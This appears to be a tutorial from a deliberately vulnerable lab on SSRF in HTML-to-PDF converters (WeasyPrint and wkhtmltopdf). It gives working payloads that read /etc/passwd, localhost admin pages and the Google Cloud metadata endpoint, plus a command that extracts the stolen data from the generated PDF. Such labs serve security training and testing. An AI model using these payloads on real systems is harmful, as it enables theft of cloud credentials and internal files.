# SSRF in HTML to PDF converter functionality

<b>Exploitation Difficulty : Easy</b><br>



<b>SSRF in Weasyprint HTML to PDF converter</b>
  
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w1.png?raw=true)

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w2.png?raw=true)

<b>Payloads</b>
To grab the data from HTTP based URL, use below mentioned style payload

    <link rel=attachment href="http://web_URL">
    <link rel=attachment href="http://localhost/admin.php">
To grab the data from internal file system, use below mentioned style payload

    <link rel=attachment href="file://internal_file_path">
    <link rel=attachment href="file:///etc/passwd">
<b>Exploiting the SSRF - Google Cloud Metadata endpoint access</b>
Let's assume, web application is hosted inside the Google Cloud Platform. Now, try to grab the data from Google Cloud internal Metadata endpoint.
I saved sample username and password during the creation of the Virtual machine which are accessible on below mentioned URL:
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes

To download and attach the HTTP response in the PDF, below mentioned payload will help:

    <link rel=attachment href="http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true">

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w3.png?raw=true)

Open the generated PDF and observe, nothing is there in customer name column. Download the generated PDF file to extract the data from it.

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w4.png?raw=true)

Extract the attached content from the downloaded PDF file using the script developed by Ben AKA Nahamsec.

    python script.py  downloaded_file.pdf
  
![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/w5.png?raw=true)


<b>SSRF in WKHTMLtoPDF HTML to PDF conveter</b>

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/wk1.png?raw=true)


![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/wk2.png?raw=true)

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/wk3.png?raw=true)

![](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/blob/master/pdf_generator/images/wk4.png?raw=true)


./Thanks

